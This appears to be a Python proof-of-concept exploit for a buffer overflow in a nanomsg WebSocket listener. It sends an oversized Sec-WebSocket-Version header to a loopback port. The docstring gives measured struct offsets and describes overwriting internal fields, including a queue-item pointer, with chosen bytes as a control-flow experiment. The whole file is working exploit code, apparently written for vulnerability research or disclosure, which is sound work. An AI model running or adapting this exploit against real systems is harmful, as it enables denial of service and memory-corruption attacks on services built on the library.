"""Inject a crafted Sec-WebSocket-Version over a real loopback nn_bind ws:// listener.

Measured from the v1.2.2 -g -O0 debug build (gdb-offset-cycle.txt):
  prefix "HTTP/1.1 400 Unsupported WebSocket Version\\r\\nSec-WebSocket-Version: "
  is 67 bytes; &self->done - self->response == 516 (4 alignment pad bytes).
  Header byte k lands at response + 67 + k, so:
    k=449 is the first chosen byte inside done (done.fsm low byte)
    k=481..488 are done.item.next (done+32) on this x86-64 layout.

Modes:
  cycle       : repeating 62-char printable alphabet, length N; byte k is
                CYCLE[k % 62]. 449%62=15, 488%62=54, one cycle, unambiguous.
  marker:HH   : 8 bytes 0xHH at k=481..488 -> done.item.next. HH=ff is
                NN_QUEUE_NOTINQUEUE ((nn_queue_item*)-1), the value queue.c:47
                asserts, so this is a chosen-byte control-flow experiment.
  q           : all 'Q' (reproduce the original 600-byte observation).
"""
import socket
import sys
import time

CYCLE = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


def make_version(n, mode):
    if mode == "cycle":
        return (CYCLE * 8)[:n]
    if mode.startswith("marker:"):
        val = int(mode.split(":")[1], 16)
        assert n >= 489, "need index 488 to reach done.item.next"
        return b"Q" * 481 + bytes([val]) * 8 + b"Z" * (n - 489)
    if mode == "q":
        return b"Q" * n
    raise ValueError(mode)


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 490
    mode = sys.argv[2] if len(sys.argv) > 2 else "cycle"
    delay = float(sys.argv[3]) if len(sys.argv) > 3 else 1.0
    ver = make_version(n, mode)
    req = (
        b"GET / HTTP/1.1\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: Upgrade\r\n"
        b"Host: localhost\r\n"
        b"Origin: http://localhost\r\n"
        b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        b"Sec-WebSocket-Version: " + ver + b"\r\n"
        b"\r\n"
    )
    if delay:
        time.sleep(delay)
    s = socket.create_connection(("127.0.0.1", 28765), timeout=5)
    s.sendall(req)
    s.settimeout(3)
    try:
        data = s.recv(8192)
        print("mode=%s n=%d reply_len=%d reply_head=%r" %
              (mode, n, len(data), data[:96]))
    except Exception as e:
        print("mode=%s n=%d recv: %s" % (mode, n, e))
    s.close()


if __name__ == "__main__":
    main()
